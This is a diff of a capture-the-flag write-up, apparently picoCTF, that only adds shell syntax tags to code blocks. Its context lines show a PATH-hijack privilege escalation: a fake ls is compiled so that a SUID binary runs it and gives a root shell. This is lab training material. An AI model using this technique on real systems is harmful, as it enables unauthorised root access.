@@ -41,7 +41,7 @@ It is important to get familiar with the machine we log into so that we can find
 * How it works: It takes the input for the directory as an environment variable
 * Other important takeaways: If it is listing the contents of a directory, it is most probably doing something with the ls binary
 
-```
+```sh
 ctf-player@pico-chall$ ls
 bin
 ctf-player@pico-chall$ file bin
@@ -87,7 +87,7 @@ First, let's log onto our machine. To logon, we will need to use ssh with the co
 `ssh -p <port> <user>@<ip>`
 After logging on, let’s list our environment variables, and try editing the PATH.
 
-```
+```sh
 ctf-player@pico-chall$ env SHELL=/bin/bash
 PWD=/home/ctf-player
 LOGNAME=ctf-player
@@ -136,7 +136,7 @@ int main()
 }
 ```
 
-```
+```sh
 ctf-player@pico-chall$ touch ls.c
 ctf-player@pico-chall$ echo "#include <stdio.h>" >> ls.c
 ctf-player@pico-chall$ echo "#include <stdlib.h>" >> ls.c
@@ -149,7 +149,7 @@ ctf-player@pico-chall$ cc ls.c -o ls
 
 Lets execute!
 
-```
+```sh
 ctf-player@pico-chall$ ./bin
 Listing the content of /root as root:
 root@challenge:/# cd /root
